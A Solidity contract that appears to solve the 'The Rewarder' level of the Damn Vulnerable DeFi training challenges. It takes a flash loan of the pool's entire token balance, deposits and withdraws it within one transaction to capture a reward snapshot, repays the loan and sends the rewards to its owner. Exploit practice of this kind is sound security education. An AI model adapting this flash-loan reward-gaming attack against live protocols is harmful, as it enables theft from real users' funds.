// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// import '@openzeppelin/contracts/access/Ownable.sol';

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
// import "./RewardToken.sol";
import "./DamnValuableToken.sol";

contract RewarderAttacker {

    address public owner;
    FlashLoanerPool public flashLoanerPool;
    TheRewarderPool public rewarderPool;
    RewardToken public rewardToken;
    DamnValuableToken public liquidityToken;

    modifier ownerOnly {
        require(msg.sender == owner, 'Attack Error: Only the Owner can attack');
        _;
    }

    constructor(address flashLoanerPoolAddress,
        address rewarderPoolAddress,
        address rewardTokenAddress,
        address liquidityTokenAddress
    ) public {
        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
        rewardToken = RewardToken(rewardTokenAddress);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        owner = msg.sender;
    }

    // needs to match function signature form the FlashLoanerPool function call
    function receiveFlashLoan(uint256 amount) public {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }

    function attack() public ownerOnly {
        uint256 amount = liquidityToken.balanceOf(address(flashLoanerPool));
        flashLoanerPool.flashLoan(amount);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

}